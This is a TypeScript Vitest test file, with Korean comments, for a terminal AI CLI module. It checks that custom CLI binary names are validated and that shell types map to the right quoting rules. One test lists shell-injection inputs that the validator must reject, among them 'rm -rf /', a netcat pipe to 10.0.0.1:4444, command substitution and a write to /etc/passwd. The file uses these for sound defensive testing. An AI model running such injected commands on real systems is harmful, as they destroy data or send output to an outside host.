// 옛 터미널 AI CLI 표(shared/aiCli.ts)에서 M3 S1 뒤에 남은 것 — custom 이름 검증(MCP 원격 카탈로그), 셸 판정,
// 조립(buildLaunch)·최근 조합·기본 플래그 시험은 그 코드와 함께, 끊김 카드(canResume·aiCliOf)는 M4 S3 에서 지웠다.
import { describe, it, expect } from 'vitest'
import { validCliBin, shellFor } from '../src/shared/aiCli'

describe('custom CLI 이름 검증', () => {
  it('평범한 이름·절대 경로는 통과', () => {
    expect(validCliBin('mycli')).toBe('mycli')
    expect(validCliBin('/usr/local/bin/my-cli_2.0')).toBe('/usr/local/bin/my-cli_2.0')
  })

  it('★ 셸 메타문자는 하나라도 있으면 거절 — 인용으로 막지 않고 아예 안 받는다', () => {
    for (const bad of [
      'claude; rm -rf /',
      'claude && whoami',
      'claude | nc 10.0.0.1 4444',
      'claude$(id)',
      'claude`id`',
      'claude > /etc/passwd',
      'claude\nwhoami',
      'my cli',
      "claude'",
      'claude\\x'
    ]) {
      expect(validCliBin(bad)).toBeNull()
    }
  })

  it('빈 값·문자열 아님 거절', () => {
    expect(validCliBin('')).toBeNull()
    expect(validCliBin('  ')).toBeNull()
    expect(validCliBin(undefined)).toBeNull()
    expect(validCliBin('a'.repeat(200))).toBeNull()
  })
})

describe('shellFor — 셸 종류에서 조립 규칙으로(#90)', () => {
  it('powershell 은 pwsh·5.1 둘 다 같은 규칙이다(구분할 방법이 없고, 그 문법이 양쪽에서 돈다)', () => {
    expect(shellFor('powershell', 'win32')).toBe('powershell')
    expect(shellFor('powershell', 'other')).toBe('powershell')
  })

  it('bash 는 posix', () => {
    expect(shellFor('bash', 'other')).toBe('posix')
  })

  it("★ 'other' 는 Windows 면 cmd — PtyBackend 의 폴백이 cmd.exe 다", () => {
    expect(shellFor('other', 'win32')).toBe('cmd')
    expect(shellFor('other', 'other')).toBe('posix')
  })
})
